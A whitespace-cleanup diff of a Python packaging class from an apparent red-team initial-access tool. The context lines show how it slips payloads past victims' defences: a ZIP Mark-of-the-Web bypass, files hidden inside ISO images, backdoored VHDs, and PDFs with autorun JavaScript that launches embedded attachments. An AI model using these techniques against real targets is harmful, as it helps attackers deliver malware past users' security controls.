@@ -52,7 +52,7 @@ def getFactoryPath(path, name = ''):
 
     if not os.path.isfile(p) and not os.path.isdir(p):
         raise FileNotFoundError(f'[!] FATAL ERROR: There is no such file: getFactoryPath("{path}", "{name}"): {p}')
-    
+
     return p
 
 class Packager:
@@ -66,7 +66,7 @@ class Packager:
         'pdf' : 'pdf',
         'vhd' : 'vhd',
         'vhdx' : 'vhd',
-        
+
         # In progress...
         #'msi' : 'msifile',
 
@@ -95,11 +95,11 @@ class Packager:
     #   HKLM\SOFTWARE\Policies\Adobe\Acrobat Reader\DC\FeatureLockDown\cDefaultLaunchAttachmentPerms
     #
     # The message will be:
-    #   "Adobe Acrobat cannot open the file attachment because your PDF file attachment 
+    #   "Adobe Acrobat cannot open the file attachment because your PDF file attachment
     #    settings do not allow this type of file to be opened."
     #
     # However .doc/.xls work like a charm ;-)
-    # 
+    #
     AdobeAcrobatReader_ExtensionsBlacklist = [
         '.acm', '.ad', '.ade', '.adp', '.air', '.app', '.application', '.appref-ms', '.arc', '.arj',
         '.asa', '.asp', '.aspx', '.asx', '.ax', '.bas', '.bat', '.bz', '.bz2', '.cab', '.cer', '.cfg',
@@ -118,13 +118,13 @@ class Packager:
         '.ws', '.wsc', '.wsf', '.wsh', '.xbap', '.xnk', '.xpi', '.z', '.zfsendtotarget', '.zip', '.zlo', '.zoo',
 
         # Additional list of extensions:
-        '.docm', 
-        '.xlsm', 
-        '.xlam', 
-        '.xltm', 
-        '.dotm', 
-        '.ppam', 
-        '.pptm', 
+        '.docm',
+        '.xlsm',
+        '.xlam',
+        '.xltm',
+        '.dotm',
+        '.ppam',
+        '.pptm',
         '.ppsm',
         '.potm',
     ]
@@ -197,10 +197,10 @@ class Packager:
         proc = subprocess.Popen(
             cmd,
             cwd = cwd,
-            shell=True, 
+            shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            startupinfo=si, 
+            startupinfo=si,
             creationflags=CREATE_NO_WINDOW
         )
         try:
@@ -220,7 +220,7 @@ class Packager:
 
     def package(self, infile, outfile, outputFormat):
         if not outputFormat:
-            self.logger.fatal('Output format could not be recognized. Make sure it is one of following: ' 
+            self.logger.fatal('Output format could not be recognized. Make sure it is one of following: '
                 + ', '.join(Packager.formatsMap.keys()))
 
         elif outputFormat == 'auto':
@@ -229,7 +229,7 @@ class Packager:
             elif 'out_format' in self.options.keys() and len(self.options['out_format']) > 0:
                 outputFormat = Packager.getFormat(self.options['out_format'])
             else:
-                self.logger.fatal('Output format could not be recognized. Make sure it is one of following: ' 
+                self.logger.fatal('Output format could not be recognized. Make sure it is one of following: '
                     + ', '.join(Packager.formatsMap.keys()))
 
         self.outputFormat = outputFormat
@@ -293,7 +293,7 @@ class Packager:
         else:
             if os.path.isfile(infile):
                 output = self.doThePacking(infile, outfile, outputFormat)
-        
+
             elif os.path.isdir(infile):
                 output = True
 
@@ -302,7 +302,7 @@ class Packager:
                     if os.path.isdir(infile1):
                         continue
                     local_path = os.path.relpath(infile1, start=infile)
-                    
+
                     output &= self.doThePacking(infile1, outfile, outputFormat, local_path)
 
                     if not self.backdoorFile:
@@ -336,15 +336,15 @@ class Packager:
     def applyZipAttributes(self, infile, outfile, attribs):
         if len(attribs) == 0:
             return
-        
+
         self.logger.info(f'Applying file attributes to {len(attribs)} files...')
-        
+
         tmpdst = ''
         with tempfile.NamedTemporaryFile() as f:
             tmpdst = f.name + os.path.splitext(outfile)[1]
 
         shutil.copyfile(outfile, tmpdst)
-        
+
         outzip = zipfile.ZipFile(tmpdst, 'w')
         inzip = zipfile.ZipFile(outfile)
         changed = False
@@ -390,7 +390,7 @@ class Packager:
                     if not self.zip_motw_bypass_warning_once:
                         self.logger.text('[-] WARNING: ZIP Read-Only MOTW bypass was fixed in MS Office 365 2208+ (or somewhere around that version)', color='yellow')
                         self.zip_motw_bypass_warning_once = True
-                
+
                     basename = os.path.basename(infile)
                     zipAttribs[basename] = 0x1 # FILE_ATTRIBUTE_READONLY
 
@@ -419,7 +419,7 @@ class Packager:
                     outfiles = []
 
                     for fname in glob.iglob(tmpdir + '/**/**', recursive=True):
-                        if os.path.isdir(fname): 
+                        if os.path.isdir(fname):
                             continue
 
                         infiles.append(fname)
@@ -499,7 +499,7 @@ class Packager:
 #            msi = msilib.OpenDatabase(outfile, msilib.MSIDBOPEN_CREATEDIRECT)
 #            name = 'foobar'
 #            schema = msilib.schema
-#            ProductName = 'foobar' 
+#            ProductName = 'foobar'
 #            ProductCode = 'foobar'
 #            ProductVersion = '1.0'
 #            Manufacturer = 'foobar'
@@ -561,7 +561,7 @@ class Packager:
                     lettersOccupied = set()
 
                     for row in reader:
-                        if row[1].lower() == 'deviceid': 
+                        if row[1].lower() == 'deviceid':
                             continue
 
                         lettersOccupied.add(row[1].lower().replace(':',''))
@@ -655,7 +655,7 @@ class Packager:
                     lettersOccupied = set()
 
                     for row in reader:
-                        if row[1].lower() == 'deviceid': 
+                        if row[1].lower() == 'deviceid':
                             continue
 
                         lettersOccupied.add(row[1].lower().replace(':',''))
@@ -747,7 +747,7 @@ class Packager:
 
             detachTemplate = detachTemplate.replace('<<<FILE>>>', outfile)
             detachTemplate = detachTemplate.replace('<<<DRIVE_LETTER>>>', vhdletter)
-                
+
             with open(diskpartDetachPath, 'w') as f:
                 f.write(detachTemplate)
 
@@ -781,9 +781,9 @@ DISKPART commands ({diskpartDetachPath}):
                     self.logger.text('[+] Backdoored existing VHD with specified input file.', color='green')
                 else:
                     self.logger.text('[+] File packed into VHD.', color='green')
-                
+
                 return True
-            
+
             else:
                 self.logger.err('Could not package files into VHD! File does not exist!')
                 return False
@@ -877,7 +877,7 @@ DISKPART> detach vdisk
 
                     for f in files:
                         self.logger.info(f'\t- {f[0]}: {f[1]}')
-                        
+
                         fn = f[1]
                         if fn.startswith('/'):
                             fn = fn[1:]
@@ -906,7 +906,7 @@ DISKPART> detach vdisk
                         for fname in glob.iglob(infile + '/**/**', recursive=True):
                             lf = fname.replace(infile, '')
 
-                            if lf == '\\' or lf == '/': 
+                            if lf == '\\' or lf == '/':
                                 continue
 
                             if lf.endswith('/') or lf.endswith('\\'):
@@ -940,15 +940,15 @@ DISKPART> detach vdisk
                             self.logger.text(f'\tAdding dir : /{jp}')
 
                             iso2.add_directory(joliet_path=f'/{jp}')
-                    
+
                     # Hide file(s) when backdooring existing iso file
-                    if self.hide != '': 
+                    if self.hide != '':
                         if type(self.hide) is list:
                             for hideFile in self.hide:
-                                self.logger.text(f'\tHiding file: //{hideFile}') 
+                                self.logger.text(f'\tHiding file: //{hideFile}')
                                 iso2.set_hidden(joliet_path=f'/{hideFile};1')
                         else:
-                            self.logger.text(f'\tHiding file: //{self.hide}') 
+                            self.logger.text(f'\tHiding file: //{self.hide}')
                             iso2.set_hidden(joliet_path=f'/{self.hide};1')
 
                     iso2.write(outfile)
@@ -974,7 +974,7 @@ DISKPART> detach vdisk
                     for fname in glob.iglob(infile + '/**/**', recursive=True):
                         lf = fname.replace(infile, '')
 
-                        if lf == '\\' or lf == '/': 
+                        if lf == '\\' or lf == '/':
                             continue
 
                         if lf.endswith('/') or lf.endswith('\\'):
@@ -991,7 +991,7 @@ DISKPART> detach vdisk
                             self.logger.dbg(f'\t- dir: {fname} => /{lf}')
                             self.logger.text(f'\tAdding dir : /{lf}')
                             iso.add_directory(joliet_path=f'/{lf}')
-                        
+
                         else:
                             lf = lf.replace('\\', '/')
 
@@ -1003,15 +1003,15 @@ DISKPART> detach vdisk
 
                             self.logger.text(f'\tAdding file: /{lf}')
                             iso.add_file(fname, joliet_path=f'/{lf};1')
-                    
-                # Hide file(s) when specified 
-                if self.hide != '': 
+
+                # Hide file(s) when specified
+                if self.hide != '':
                     if type(self.hide) is list:
                         for hideFile in self.hide:
-                            self.logger.text(f'\tHiding file: //{hideFile}') 
+                            self.logger.text(f'\tHiding file: //{hideFile}')
                             iso.set_hidden(joliet_path=f'/{hideFile};1')
                     else:
-                        self.logger.text(f'\tHiding file: //{self.hide}') 
+                        self.logger.text(f'\tHiding file: //{self.hide}')
                         iso.set_hidden(joliet_path=f'/{self.hide};1')
 
                 iso.write(outfile)
@@ -1044,8 +1044,8 @@ DISKPART> detach vdisk
 
         # The Filespec entry
         efEntry = DictionaryObject()
-        efEntry.update({ 
-            NameObject("/F"): file_entry 
+        efEntry.update({
+            NameObject("/F"): file_entry
         })
 
         filespec = DictionaryObject()
@@ -1057,7 +1057,7 @@ DISKPART> detach vdisk
 
         if "/Names" not in myPdfFileWriterObj._root_object.keys():
             self.logger.dbg('No files attached yet. Create the entry for the root, as it needs a reference to the Filespec')
-            
+
             embeddedFilesNamesDictionary = DictionaryObject()
             embeddedFilesNamesDictionary.update({
                 NameObject("/Names"): ArrayObject([createStringObject(fname), filespec])
@@ -1107,7 +1107,7 @@ blacklisted extension, where the default blacklist is following:
 {exts}
 
 The message will be:
-  "Adobe Acrobat cannot open the file attachment because your PDF file attachment 
+  "Adobe Acrobat cannot open the file attachment because your PDF file attachment
    settings do not allow this type of file to be opened."
 
 Be vary about that, becasue this MAY HINDER your target initial access stage!
@@ -1152,7 +1152,7 @@ Pssst. .doc/.xls work like a charm ;-)
                         self.logger.fatal('Files are embedded into PDF in a flat structure. There is no way to create directories!')
 
                     files.append(filename)
-            
+
             self.logger.text('Embedding files into PDF:')
 
             for myfile in files:
@@ -1164,7 +1164,7 @@ Pssst. .doc/.xls work like a charm ;-)
 
                 autorunJs = f'this.exportDataObject({{ cName: "{fname}", nLaunch: 2 }});'
                 self.logger.dbg('\t' + autorunJs + '\n')
-                
+
                 fw.addJS(autorunJs)
 
                 if len(files) == 1:
@@ -1217,7 +1217,7 @@ When PDF is password-encrypted, autorun Javascript will not execute to prompt us
                     arc = cabarchive.CabArchive(f.read())
 
                 self.logger.dbg('Extracting files from CAB:')
-                
+
                 for k, v in arc.items():
                     lp = os.path.join(tmpdir.name, v.filename)
 
@@ -1261,7 +1261,7 @@ When PDF is password-encrypted, autorun Javascript will not execute to prompt us
                     for file in glob.iglob(infile + '/**/**', recursive=True):
                         lf = file.replace(infile, '')
 
-                        if lf == '\\' or lf == '/': 
+                        if lf == '\\' or lf == '/':
                             continue
 
                         if lf.endswith('/') or lf.endswith('\\'):
@@ -1279,7 +1279,7 @@ When PDF is password-encrypted, autorun Javascript will not execute to prompt us
                             arc[lf] = cabarchive.CabFile(f.read())
 
                         self.logger.text(f'\tAdding file: {lf}')
-                    
+
                     container.write(arc.save())
 
             return True
